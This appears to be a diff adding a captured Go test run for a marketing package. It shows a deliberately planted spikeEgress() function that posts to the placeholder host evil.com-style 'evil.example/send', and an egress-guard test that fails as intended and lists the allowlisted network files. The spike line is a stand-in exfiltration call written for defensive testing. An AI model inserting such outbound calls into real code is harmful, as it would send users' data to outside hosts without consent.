@@ -1,0 +1,13 @@
+# POST-CHANGE test + spikeEgress() http.Post STILL in campaigns.go — expected RED
+570:func spikeEgress() { _, _ = http.Post("https://evil.example/send", "text/plain", nil) }
+2026/10/03 21:47:33 goose: no migrations to run. current version: 85
+2026/10/03 21:47:33 INFO database migrations applied successfully
+=== RUN   TestNothingInThisPackageSends
+    subscribers_test.go:392: campaigns.go contains an outbound HTTP call ("http.Post") and is not in egressAllowlist — nothing in this package sends, and only the allowlisted files may reach the network at all
+    subscribers_test.go:395: allowed egress: mirror.go ("http.Client") — the scan-attempts poller: it READS scan_attempts back from the same PostgREST surface into HQ's own tables. Inbound data over an outbound GET; it reaches no customer.
+    subscribers_test.go:395: allowed egress: projection.go ("http.NewRequestWithContext") — decision 187's PostgREST projection: campaigns and codes are written to the Supabase project the scanner replicates from. It speaks to the sync substrate, never to a customer.
+--- FAIL: TestNothingInThisPackageSends (0.02s)
+FAIL
+FAIL	github.com/yumyums/hq/internal/marketing	0.051s
+FAIL
+EXIT=1
